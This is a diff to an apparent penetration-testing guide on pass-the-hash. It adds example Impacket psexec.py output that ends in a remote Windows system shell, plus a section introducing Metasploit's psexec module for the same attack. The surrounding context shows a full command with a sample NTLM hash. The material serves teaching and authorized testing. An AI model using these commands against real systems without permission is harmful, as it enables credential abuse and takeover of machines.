@@ -404,6 +404,23 @@ NTLM    : 9BFEA4F8177A11F06B37957A55B13F70
 * You can run PsExec either from the directory the script is in with `./` or by providing the full file path. Using the previous example with the username `Example-Admin` would be `./psexec.py -hashes :9BFEA4F8177A11F06B37957A55B13F70 example.com/Example-Admin@<Target IP>`. The output would then look something like the following. If your hash is successfully passed, you'll have a shell on the target with the provided credentials:
   * If you are wondering why we included the colon appended to the start of the NTLM hash, it's because Microsoft still expects the old format, [LM]:[NTLM]. Need to let them know you do not have the LM (LAN Manager) hash. 
 ```
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Requesting shares on <Target IP>.....
+[*] Found writable share ADMIN$
+[*] Uploading file RQVmzfVc.exe
+[*] Opening SVCManager on <Target IP>.....
+[*] Creating service YTms on <Target IP>.....
+[*] Starting service YTms.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.3091]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+## Pass-the-hash with Metasploit
+* Alternatively to PsExec, Metasploit has a PsExec exploit module, `exploit/windows/smb/psexec`, which allows you to run a pass-the-hash attack against a target:
+```
 Module options (exploit/windows/smb/psexec):
 
   Name               Current Setting  Required  Description
